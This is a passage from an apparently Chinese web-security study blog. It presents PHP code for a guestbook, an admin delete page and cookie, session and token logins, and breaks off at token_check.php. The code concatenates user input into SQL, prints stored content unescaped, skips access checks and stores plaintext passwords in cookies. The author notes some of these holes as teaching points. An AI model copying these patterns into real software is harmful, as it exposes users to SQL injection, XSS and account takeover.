class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//调用ueditor</span><br>&lt;script src=<span class="hljs-string">&quot;/ueditor/ueditor.config.js&quot;</span>&gt;<span class="hljs-comment">/*引入配置文件*/</span>&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&quot;/ueditor/ueditor.all.js&quot;</span>&gt;<span class="hljs-comment">/*引入源码文件*/</span>&lt;/script&gt;<br><br><br><br>&lt;!-- <span class="hljs-number">9</span>-<span class="hljs-number">24</span>行都是前端显示界面 --&gt;<br><br>&lt;form id=<span class="hljs-string">&quot;form1&quot;</span> name=<span class="hljs-string">&quot;form1&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> action=<span class="hljs-string">&quot;&quot;</span>&gt;<br>    &lt;!-- action代表发送目标，留空就是自己；post就是提交数据 --&gt;<br><br>        用户名：&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span>&gt;&lt;br&gt;<br>        &lt;!-- 给name值，这是一个传参值，假如输入<span class="hljs-number">123</span>，那用户名就为<span class="hljs-number">123</span> --&gt;<br><br>    内容：<br><br>        &lt;textarea id=<span class="hljs-string">&quot;content&quot;</span> rows=<span class="hljs-string">&quot;10&quot;</span> cols=<span class="hljs-string">&quot;70&quot;</span> name=<span class="hljs-string">&quot;content&quot;</span> style=<span class="hljs-string">&quot;...&quot;</span>&gt;<br>        &lt;/textarea&gt;<br>        &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>            UE.<span class="hljs-title function_ invoke__">getEditor</span>(<span class="hljs-string">&quot;content&quot;</span>);<br>            <span class="hljs-comment">//实例化编辑器传参，ID为讲要被替换的容器</span><br>        &lt;/script&gt;<br><br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;sumbit&quot;</span> id=<span class="hljs-string">&quot;sumbit&quot;</span> value=<span class="hljs-string">&quot;提交&quot;</span>&gt;<br><br>&lt;/form&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;   <span class="hljs-comment">//与config.php共享代码</span><br><br><span class="hljs-comment">//30-45行就是为了添加留言的功能</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_gbook</span>(<span class="hljs-params"><span class="hljs-variable">$con</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$u</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];  <span class="hljs-comment">//接收表单username的值，@符号为容错符号，防止没有数据浏览器进行报错提示</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$u</span>)) &#123;      <span class="hljs-comment">//如果接收到值的话</span><br>        <span class="hljs-variable">$c</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];   <span class="hljs-comment">//POST是第一行的全局变量，是PHP接收数据用的，如果是GET那就改成GET</span><br>        <span class="hljs-variable">$i</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];    <span class="hljs-comment">//获取IP地址</span><br>        <span class="hljs-variable">$ua</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];   <span class="hljs-comment">//获取浏览器版本信息</span><br><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) values (&#x27;<span class="hljs-subst">$u</span>&#x27;,&#x27;<span class="hljs-subst">$c</span>&#x27;,&#x27;<span class="hljs-subst">$i</span>&#x27;,&#x27;<span class="hljs-subst">$ua</span>&#x27;);&quot;</span>;  <span class="hljs-comment">//构建SQL数据库语句，使用双引号识别变量</span><br>        <span class="hljs-comment">//vlue函数里接收的是下面函数的变量，使用单引号括起来，因为接收的值可能是非数值型</span><br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>)) &#123;    <span class="hljs-comment">//数据库执行语句，加一个if判断语句</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;);&lt;/script&gt;&quot;</span>;    <span class="hljs-comment">//因为是JS语句，在JS代码中不行，所以直接输出</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//48-61行就是为了显示留言数据的</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_gbook</span>(<span class="hljs-params"><span class="hljs-variable">$con</span>,<span class="hljs-variable">$del</span></span>)</span>&#123;     <span class="hljs-comment">//设置参数</span><br>    <span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from gbook&quot;</span>;    <span class="hljs-comment">//查询数据库所有数据</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>);    <span class="hljs-comment">//执行该结果并将结果存储在data中</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>))&#123;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;内容：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;IP地址：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;UA浏览器：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$del</span>==<span class="hljs-string">&#x27;del&#x27;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;gbook-admin.php?del=<span class="hljs-subst">$row</span>[0]&#x27;&gt;删除&lt;/a&gt;&quot;</span>;   <span class="hljs-comment">//输出这个值</span><br>         &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">add_gbook</span>(<span class="hljs-variable">$con</span>);<br><span class="hljs-title function_ invoke__">show_gbook</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;x&#x27;</span>);   <span class="hljs-comment">//赋值一个错误值就不显示删除，由于52行没有输出x，所以不会显示删除按钮</span><br><br><br><br><br><span class="hljs-comment">//判断是否连接成功</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$con</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接错误：&quot;</span> .<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());      <span class="hljs-comment">//如果错误就提示，正确不提示</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$u</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];  <span class="hljs-comment">//接收表单username的值，@符号为容错符号，防止没有数据浏览器进行报错提示</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$u</span>))&#123;      <span class="hljs-comment">//如果接收到值的话</span><br>        <span class="hljs-variable">$c</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];   <span class="hljs-comment">//POST是第一行的全局变量，是PHP接收数据用的，如果是GET那就改成GET</span><br>        <span class="hljs-variable">$i</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];    <span class="hljs-comment">//获取IP地址</span><br>        <span class="hljs-variable">$ua</span> = @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];   <span class="hljs-comment">//获取浏览器版本信息</span><br><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) values (&#x27;<span class="hljs-subst">$u</span>&#x27;,&#x27;<span class="hljs-subst">$c</span>&#x27;,&#x27;<span class="hljs-subst">$i</span>&#x27;,&#x27;<span class="hljs-subst">$ua</span>&#x27;);&quot;</span>;  <span class="hljs-comment">//构建SQL数据库语句，使用双引号识别变量</span><br>        <span class="hljs-comment">//vlue函数里接收的是下面函数的变量，使用单引号括起来，因为接收的值可能是非数值型</span><br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>))&#123;    <span class="hljs-comment">//数据库执行语句，加一个if判断语句</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;);&lt;/script&gt;&quot;</span>;    <span class="hljs-comment">//因为是JS语句，在JS代码中不行，所以直接输出</span><br><br>            <span class="hljs-comment">//查询并显示留言列表</span><br>            <span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from gbook&quot;</span>;    <span class="hljs-comment">//查询数据库所有数据</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>);    <span class="hljs-comment">//执行该结果并将结果存储在data中</span><br>            <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;内容：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;IP地址：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;UA浏览器：&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;留言失败！&#x27;);&lt;/script&gt;&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;用户名不能为空！&#x27;)&lt;/script&gt;&quot;</span>;  <span class="hljs-comment">//用户名为空的情况</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
<p> config.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//数据库通信</span><br><span class="hljs-variable">$dbip</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&#x27;dome01&#x27;</span>;   <span class="hljs-comment">//固定这四个地址</span><br><br><span class="hljs-comment">//使用该函数来与数据库建立连接</span><br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$dbip</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p> gbook-admin.php（没有做用户权限判定）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;../config.php&#x27;</span>;   <span class="hljs-comment">//包含文件</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;../gbook.php&#x27;</span>;     <span class="hljs-comment">//调用该文件</span><br><br><span class="hljs-title function_ invoke__">show_gbook</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;del&#x27;</span>);   <span class="hljs-comment">//显示gbook文件内容中$con值，显示删除按钮</span><br><br><br><span class="hljs-variable">$delstr</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;del&#x27;</span>];     <span class="hljs-comment">//接收del的值，参数名位del</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$delstr</span>))&#123;     <span class="hljs-comment">//判断有值进入的时候再进行操作，否则不处理</span><br>    <span class="hljs-variable">$sql2</span> = <span class="hljs-string">&quot;delete from gbook where username = &#x27;<span class="hljs-subst">$delstr</span>&#x27;;&quot;</span>;<br>    <span class="hljs-comment">//接收完之后要重新组织SQL语句</span><br>    <span class="hljs-comment">//条件是表名为gbook，因为接收的是用户名，所以接收的列名是username，接收的值为delstr</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql2</span>))&#123;      <span class="hljs-comment">//执行该结果并将结果存储在data中,并判断一下返回结果</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;删除成功！&#x27;)&lt;/script&gt;&quot;</span>;     <span class="hljs-comment">//删除成功的弹窗</span><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>这里基本把源码都放上来了，感觉有些多余，观感也不是很好，后面只选一些重要的源码和步骤发上来</p>
<p>‍</p>
<p>‍</p>
<h3 id="PHP应用-后台模块-Session-Cookie-Token-身份验证-唯一性"><a href="#PHP应用-后台模块-Session-Cookie-Token-身份验证-唯一性" class="headerlink" title="PHP应用&amp;后台模块&amp;Session&amp;Cookie&amp;Token&amp;身份验证&amp;唯一性"></a>PHP应用&amp;后台模块&amp;Session&amp;Cookie&amp;Token&amp;身份验证&amp;唯一性</h3><ol>
<li><p>用cookie做后台身份验证</p>
<ul>
<li><p>admin-c.php<br>登录页面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">//1. 接受输入的账号和密码</span><br><span class="hljs-variable">$user</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$pass</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-comment">//2. 判断账号密码正确性</span><br><span class="hljs-comment">//连接数据库,进行查询</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from admin where username=&#x27;<span class="hljs-subst">$user</span>&#x27; and password=&#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;POST&quot;</span>)&#123;<br>    <span class="hljs-comment">//3. 判断用户登陆成功,并且生成的cookie进行保存</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$data</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$expire</span> = <span class="hljs-title function_ invoke__">time</span>() + <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">24</span> * <span class="hljs-number">30</span>;  <span class="hljs-comment">//一个月之后过期</span><br>        <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$expire</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-variable">$pass</span>, <span class="hljs-variable">$expire</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br>        <span class="hljs-comment">//echo &#x27;&lt;script&gt;alert(&quot;登陆成功！&quot;)&lt;/script&gt;&#x27;;</span><br>        <span class="hljs-comment">//4. 跳转至成功登陆的页面</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:index-c.php&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//3_1. 判断用户登录失败并提示</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;登陆失败！&quot;)&lt;/script&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li>
<li><p>index-c.php<br>登陆成功页面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-string">&#x27;123456&#x27;</span>)&#123;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:index-c.php&#x27;</span>);  <span class="hljs-comment">//这里不断重定向到自己实现无限循环</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>若没有cookie则会（同时这里如果拿到相应的cookie就实现了会话劫持—&gt;导致未授权登录漏洞）</p>
<p><img src="/assets/image-20240628223109-mi519kh.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>登出页面</p>
<p>logout.phhp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-title function_ invoke__">time</span>() - <span class="hljs-number">3600</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-title function_ invoke__">time</span>() - <span class="hljs-number">3600</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-comment">// 跳转到登录页面</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: admin-c.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>用session做后台身份验证</p>
<ul>
<li><p>登录页面</p>
<p><img src="/assets/image-20240629105408-qyqol3z.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>admin-s.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//登录文件-采用session验证</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;../config.php&#x27;</span>;<br><span class="hljs-comment">//1. 接受输入的账号和密码</span><br><span class="hljs-variable">$user</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$pass</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-comment">//2. 判断账号密码正确性</span><br><span class="hljs-comment">//连接数据库,进行过数据库查询将数据进行对比</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from admin where username=&#x27;<span class="hljs-subst">$user</span>&#x27; and password=&#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//如果是通过POST方法提交的表单</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == <span class="hljs-string">&quot;POST&quot;</span>)&#123;<br>    <span class="hljs-comment">//判断用户登录成功</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$data</span>) &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">//启动会话</span><br>        <span class="hljs-title function_ invoke__">session_start</span>();<br>        <span class="hljs-comment">//将用户名和密码储存到会话中</span><br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$user</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>]=<span class="hljs-variable">$pass</span>;<br>        <span class="hljs-comment">//跳转到登陆成功的页面</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:index-s.php&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>();<span class="hljs-comment">//终止脚本执行,确保页面重定向生效</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//判断用户登录失败</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;登陆失败！&quot;)&lt;/script&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
<li><p>登陆成功页面</p>
<p><img src="/assets/image-20240629105449-mmgjepf.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>登陆成功之后产生一个session文件，session文件的路径在php.ini中的<code>session.save_path</code>​里</p>
<p><img src="/assets/image-20240629110024-5hfzf1o.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p><img src="/assets/image-20240629105854-ac52sun.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>index-s.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//登陆成功页面-采用session验证</span><br><span class="hljs-comment">//启动会话</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp; @<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>]!==<span class="hljs-string">&#x27;123456&#x27;</span>)<span class="hljs-comment">//判断省去了数据库查询获取账号密码的操作，直接赋值</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:admin-s.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<span class="hljs-comment">//终止脚本执行，确保页面重定向生效</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
<li><p>登出页面</p>
<p>logout-s.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//开始会话</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">//清除session变量，并销毁会话</span><br><span class="hljs-title function_ invoke__">session_unset</span>();<br><span class="hljs-title function_ invoke__">session_destroy</span>();<br><br><span class="hljs-comment">//重定向到登录页面</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:admin-s.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>用token做用户登录判断</p>
<p> token.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//开始会话</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">// 生成一个16字节的随机Token，并将其转换为十六进制表示存储在Session中</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p> token_check.php</p>
